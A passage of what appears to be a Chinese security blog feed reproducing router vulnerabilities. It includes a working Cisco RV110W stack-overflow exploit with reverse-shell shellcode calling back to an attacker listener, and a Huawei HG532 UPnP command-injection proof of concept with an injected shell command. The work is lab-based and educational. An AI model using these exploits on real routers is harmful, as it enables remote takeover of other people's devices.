title="定位固件"></a>定位固件</h2><p>因为CVE-2020-3331和CVE-2020-3323都说的是Web，而且目标也只开放了443端口，故我们先找到Web对应的二进制程序，有两种方式：<br>1.固件搜索Web相关的二进制程序<br>2.在设备shell中查看端口绑定的进程对应的程序</p><p><strong>方法一：通过开放端口找：</strong><br>telnet进去之后我们发现设备自带的netstat无法查看端口对应进程号，所以可以下载一版比较全的<a href="https://busybox.net/downloads/binaries/1.21.1/busybox-mipsel" target="_blank" rel="noopener">busybox</a></p><p>在本机打开web服务：</p><pre class="line-numbers language-bash"><code class="language-bash">python -m SimpleHTTPServer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在路由器上使用wget下载，不过在下载前可以检查一下文件系统是否有写权限，一般来说/tmp目录是肯定可以写的，不过这个目录一般也无法持久化保存，重启后一般不会保存。另外还需要查看一下可写目录的空间是否足够大，可以使用df -h命令，不过一般来说，传个busybox和gdbserver上去是不成问题的：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> http://x.x.x.x:8000/busybox-mipsel./busybox-mipsel <span class="token function">netstat</span> -pantu <span class="token operator">|</span> <span class="token function">grep</span> 443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/6.png"></div><p><strong>方法二：搜索固件</strong></p><p>在访问web配置页面的时候url为<a href="https://192.168.1.107/login.cgi，所以在文件系统中直接搜索" target="_blank" rel="noopener">https://192.168.1.107/login.cgi，所以在文件系统中直接搜索</a></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">grep</span> -Rn <span class="token string">"login.cgi"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现usr/sbin/httpd匹配</p><h2 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h2><p>对该文件进行分析，漏洞存在于这个位置：</p><div style="width:70%;margin:auto">{% asset_img 7.png %}</div><div style="width:70%;margin:auto">{% asset_img 8.png %}</div><p>我们看到stack1_0x40和stack_0x40都是栈上分配的栈空间，sscanf可以栈溢出</p><p>解释一下：%[^;];%<em>[^=]=%[^\n]，这里% 表示选择，%</em> 表示过滤，中括号括起来的是类似正则的字符集，意思就是：</p><p>%[^;]      分号前的所有字符都要<br>;%*[^=]  分号后，等号前的字符都不要<br>=%[^\n] 等号后，换行符前的所有字符都要</p><p>举个例子111;222=333</p><p>stack_0x40 = 111<br>stack1_0x40 = 333</p><div style="width:70%;margin:auto">{% asset_img 9.png %}</div><p>分析程序路径要到达这个sscanf得有三个参数且满足对应的要求：</p><ul><li>cmac：mac地址格式</li><li>cip：ip地址格式</li><li>submit_button: 包含status_guestnet.asp</li></ul><p>接下来就要知道是怎么交互的，用POST还是GET？可以测试一下看看。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://192.168.1.107/guest_logout.cgi"</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"cmac"</span><span class="token punctuation">:</span><span class="token string">"12:af:aa:bb:cc:dd"</span><span class="token punctuation">,</span><span class="token string">"submit_button"</span><span class="token punctuation">:</span><span class="token string">"status_guestnet.asp"</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token string">"cip"</span><span class="token punctuation">:</span><span class="token string">"192.168.1.100"</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">#requests.get(url, data=payload, verify=False, timeout=1)</span>requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/10.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/11.png"></div><p>已经挂掉了，重启恢复。</p><h2 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h2><p>从海特实验室搜集的各种平台的gdbserver中下载一个gdbserver上传到路由器上去，然后挂载到httpd进程上对其进行调试，gdbserver-7.12-mipsel-mips32rel2-v1-sysv可以用。下载后依然传到路由器里面。</p><p><strong>第一步：利用gdbserver附加到httpd进程上Shell2</strong>：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chmod</span> +x gdbserver-7.12-mipsel-mips32rel2-v1-sysv <span class="token function">ps</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"httpd"</span> ./gdbserver-7.12-mipsel-mips32rel2-v1-sysv :1234 --attach 356<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/12.png"></div><p><strong>第二步：使用gdb-multiarch加载httpd文件进行远程调试：</strong></p><pre class="line-numbers language-bash"><code class="language-bash">gdb-mutiarch httpdtarget remote 路由器ip:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>第三步：发送payload，生成100个字符来进行测试偏移：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"https://10.10.10.1/guest_logout.cgi"</span>payload <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"cmac"</span><span class="token punctuation">:</span><span class="token string">"12:af:aa:bb:cc:dd"</span><span class="token punctuation">,</span><span class="token string">"submit_button"</span><span class="token punctuation">:</span><span class="token string">"status_guestnet.asp"</span><span class="token operator">+</span><span class="token string">'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa'</span><span class="token punctuation">,</span><span class="token string">"cip"</span><span class="token punctuation">:</span><span class="token string">"192.168.1.100"</span><span class="token punctuation">}</span>requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到httpd已经崩掉了：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/13.png"></div><p>偏移是85</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里想拿shell最容易的就是考虑shellcode比较简单，因为我们需要反弹一个shell。httpd进程的libc基址就是2af98000，无论你是重启进程，还是升级版本，这个基址都不变。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/14.png"></div><p>可以通过shellcode来完成，利用libc.so.0找到合适的gadgets，输入shellcode，跳转回来执行shellcode</p><p>从msfvenom生成回连的shell：</p><pre class="line-numbers language-bash"><code class="language-bash">msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST<span class="token operator">=</span>attackPC addr  LPORT<span class="token operator">=</span>8888 --arch mipsle --platform linux -f py -o shellcode.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>poc</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> thread<span class="token punctuation">,</span>requestscontext<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'mips'</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> <span class="token number">0x2af98000</span>jmp_a0 <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x0003D050</span>  <span class="token comment" spellcheck="true"># move  $t9,$a0             ; jalr  $t9  | $s0      第二次跳转到这里</span>jmp_s0 <span class="token operator">=</span> libc <span class="token operator">+</span> <span class="token number">0x000257A0</span>  <span class="token comment" spellcheck="true"># addiu $a0,$sp,0x38+var_20 ; jalr  $s0  | $ra  第一次跳转</span><span class="token comment" spellcheck="true"># msfvenom -p linux/mipsle/shell_reverse_tcp  LHOST=10.10.10.101 LPORT=8888 --arch mipsle --platform linux -f py -o shellcode.py</span>buf <span class="token operator">=</span>  b<span class="token string">""</span>buf <span class="token operator">+=</span> b<span class="token string">"\xfa\xff\x0f\x24\x27\x78\xe0\x01\xfd\xff\xe4\x21\xfd"</span>buf <span class="token operator">+=</span> b<span class="token string">"\xff\xe5\x21\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x01"</span>buf <span class="token operator">+=</span> b<span class="token string">"\x01\x01\xff\xff\xa2\xaf\xff\xff\xa4\x8f\xfd\xff\x0f"</span>buf <span class="token operator">+=</span> b<span class="token string">"\x34\x27\x78\xe0\x01\xe2\xff\xaf\xaf\x22\xb8\x0e\x3c"</span>buf <span class="token operator">+=</span> b<span class="token string">"\x22\xb8\xce\x35\xe4\xff\xae\xaf\x0a\x65\x0e\x3c\x0a"</span>buf <span class="token operator">+=</span> b<span class="token string">"\x0a\xce\x35\xe6\xff\xae\xaf\xe2\xff\xa5\x27\xef\xff"</span>buf <span class="token operator">+=</span> b<span class="token string">"\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24\x0c\x01\x01"</span>buf <span class="token operator">+=</span> b<span class="token string">"\x01\xfd\xff\x11\x24\x27\x88\x20\x02\xff\xff\xa4\x8f"</span>buf <span class="token operator">+=</span> b<span class="token string">"\x21\x28\x20\x02\xdf\x0f\x02\x24\x0c\x01\x01\x01\xff"</span>buf <span class="token operator">+=</span> b<span class="token string">"\xff\x10\x24\xff\xff\x31\x22\xfa\xff\x30\x16\xff\xff"</span>buf <span class="token operator">+=</span> b<span class="token string">"\x06\x28\x62\x69\x0f\x3c\x2f\x2f\xef\x35\xec\xff\xaf"</span>buf <span class="token operator">+=</span> b<span class="token string">"\xaf\x73\x68\x0e\x3c\x6e\x2f\xce\x35\xf0\xff\xae\xaf"</span>buf <span class="token operator">+=</span> b<span class="token string">"\xf4\xff\xa0\xaf\xec\xff\xa4\x27\xf8\xff\xa4\xaf\xfc"</span>buf <span class="token operator">+=</span> b<span class="token string">"\xff\xa0\xaf\xf8\xff\xa5\x27\xab\x0f\x02\x24\x0c\x01"</span>buf <span class="token operator">+=</span> b<span class="token string">"\x01\x01"</span>url <span class="token operator">=</span> <span class="token string">"https://10.10.10.1/guest_logout.cgi"</span>pd1 <span class="token operator">=</span> <span class="token string">"status_guestnet.asp"</span><span class="token operator">+</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">49</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>jmp_a0<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">85</span><span class="token operator">-</span><span class="token number">49</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>jmp_s0<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'c'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>bufpd2 <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"cmac"</span><span class="token punctuation">:</span><span class="token string">"12:af:aa:bb:cc:dd"</span><span class="token punctuation">,</span><span class="token string">"submit_button"</span><span class="token punctuation">:</span>pd1<span class="token punctuation">,</span><span class="token string">"cip"</span><span class="token punctuation">:</span><span class="token string">"192.168.1.100"</span><span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">attack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>         requests<span class="token punctuation">.</span>packages<span class="token punctuation">.</span>urllib3<span class="token punctuation">.</span>disable_warnings<span class="token punctuation">(</span><span class="token punctuation">)</span>        requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>pd2<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>         <span class="token keyword">pass</span>io <span class="token operator">=</span> listen<span class="token punctuation">(</span><span class="token number">8888</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#创建一个TCP或UDP套接字以接收数据</span>thread<span class="token punctuation">.</span>start_new_thread<span class="token punctuation">(</span>attack<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#开始一个新的线程，从attack函数开始运行</span>io<span class="token punctuation">.</span>wait_for_connection<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#阻塞直到建立连接</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"getshell"</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到cisco的shell</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/02/06/si-ke-lu-you-qi-rv110w-cve-2020-3331-cve-2020-3323-lou-dong-fu-xian/15.png"></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 从0学习路由器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由器漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为HG532路由器漏洞CVE-2017-17215分析</title>
      <link href="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/"/>
      <url>/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>华为HG532产品存在远程命令执行漏洞，华为HG532 系列路由器是一款为家庭和小型办公用户打造的高速无线路由器产品</p><h1 id="固件解压"><a href="#固件解压" class="headerlink" title="固件解压"></a>固件解压</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/0.png"></div>这个squashfs_root将会被我们拷贝到qemu中<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>下载qemu</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu binfmt-support qemu-user-static<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>下载qemu启动虚拟机所需要的“镜像”，这个地方的镜像是和之前的固件版本要匹配，MIPS，32位，大端</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> https://people.debian.org/~aurel32/qemu/mips/debian_squeeze_mips_standard.qcow2<span class="token function">wget</span> https://people.debian.org/~aurel32/qemu/mips/vmlinux-2.6.32-5-4kc-malta<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>创建虚拟网桥，实现虚拟机内部和Ubuntu的连接</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> bridge-utils<span class="token function">sudo</span> brctl addbr Virbr0<span class="token function">sudo</span> <span class="token function">ifconfig</span> Virbr0 192.168.153.1/24 up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/1.png"></div><p>创建tap接口，名字为tap0，并添加到网桥</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> tunctl -t tap0<span class="token function">sudo</span> <span class="token function">ifconfig</span> tap0 192.168.153.11/24 up<span class="token function">sudo</span> brctl addif Virbr0 tap0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/2.png"></div><p>起qemu：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> qemu-system-mips -M malta -kernel vmlinux-2.6.32-5-4kc-malta -hda debian_squeeze_mips_standard.qcow2 -append <span class="token string">"root=/dev/sda1 console=tty0"</span> -netdev tap,id<span class="token operator">=</span>tapnet,ifname<span class="token operator">=</span>tap0,script<span class="token operator">=</span>no -device rtl8139,netdev<span class="token operator">=</span>tapnet -nographic<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div style="width:70%;margin:auto">{% asset_img 3.png %}</div><p>在启动的虚拟机里面添加一个IP，并尝试ping外界</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ifconfig</span> eth0 192.168.153.2/24 up<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/4.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/5.png"></div><p>将之前解压出来的squashfs-root文件夹通过scp命令，复制到虚拟机中</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">scp</span> -r squashfs-root/ root@192.168.153.2:~/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在虚拟机中挂载dev和proc</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mount</span> -o bind /dev ./squashfs-root/dev<span class="token function">mount</span> -t proc /proc ./squashfs-root/proc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>启动shell</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chroot</span> squashfs-root sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><div style="width:70%;margin:auto">{% asset_img 6.png %}</div><p>这个终端是用来改ip地址的，单独在开一个终端ssh上去，启动路由器。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ssh</span> root@192.168.153.2<span class="token function">chroot</span> squashfs-root /bin/sh./bin/upnp./bin/mic<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这个通过ssh连接的终端实际上已经无法使用了，因为虚拟机里面的路由器IP发生了变化，ssh连接已经断开，返回之前的虚拟机中的终端。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/7.png"></div><p>需要重新更改路由器的IP，以便于外部的Ubuntu登录管理界面</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ifconfig</span> eth0 192.168.153.2/24 up<span class="token function">ifconfig</span> br0 192.168.153.11/24 up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/8.png"></div><p>这个时候在Ubuntu上使用浏览器访问路由器eth0的IP地址，就可以登录进入管理界面，默认的账号密码是：admin，@Hua1234</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/9.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/10.png"></div><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>利用已有的poc进行测试一下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests headers <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"Authorization"</span><span class="token punctuation">:</span> <span class="token string">"Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"</span><span class="token punctuation">}</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;?xml version="1.0" ?> &lt;s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">  &lt;s:Body>&lt;u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">   &lt;NewStatusURL>;mkdir /bin/hell;&lt;/NewStatusURL>   &lt;NewDownloadURL>HUAWEIUPNP&lt;/NewDownloadURL>  &lt;/u:Upgrade> &lt;/s:Body>&lt;/s:Envelope>'''</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://192.168.153.2:37215/ctrlt/DeviceUpgrade_1'</span><span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/11.png"></div><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/12.png"></div><p>根据信息可知，漏洞处于upnp服务中，可直接将bin/upnp拖到IDA里面分析，也可以根据poc中的特征字符串ctrlt以及DeviceUpgrade_1寻找，看该字符串处于哪个可执行程序当中。</p><p>根据poc，注入点是<newstatusurl>以及<newdownloadurl>，在字符串中找到它们：</newdownloadurl></newstatusurl></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/13.png"></div><p>看到调用函数是在函数sub_40749c当中，跟过去该函数，可以看到，程序通过ATP_XML_GetChildNodeByName函数获取xml中的<newstatusurl>节点，并且未经过检查就直接与upg -g -U %s -t ‘1 Firmware Upgrade Image’ -c upnp -r %s -d -拼接使用system函数进行执行。</newstatusurl></p><p>具体来说是首先在<newstatusurl>输入单引号将前面的字符串闭合，然后再注入相应的执行命令即可，如需要执行ls命令，则需要做的就是构造<newstatusurl>‘;ls;</newstatusurl>节点即可。该节点字符串与upg -g -U %s -t ‘1 Firmware Upgrade Image’ -c upnp -r %s -d -拼接得到upg -g -U %s -t ‘1 Firmware Upgrade Image’ -c upnp -r ‘;ls; -d -，然后执行system调用，实现注入。</newstatusurl></p><h1 id="继续尝试触发漏洞"><a href="#继续尝试触发漏洞" class="headerlink" title="继续尝试触发漏洞"></a>继续尝试触发漏洞</h1><p>尝试了一天反弹shell也没成功，没有常见的nc、telnet服务</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/01/25/hua-wei-hg532-lu-you-qi-lou-dong-cve-2017-17215-fen-xi/14.png"></div><p>拿一个flag暂时结束吧Orz…</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 从0学习路由器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 路由器漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>D-Link DIR-505越界漏洞分析</title>
      <link href="/2021/01/22/d-link-dir-505-yue-jie-lou-dong-fen-xi/"/>
      <url>/2021/01/22/d-link-dir-505-yue-jie-lou-dong-fen-xi/</url>
      
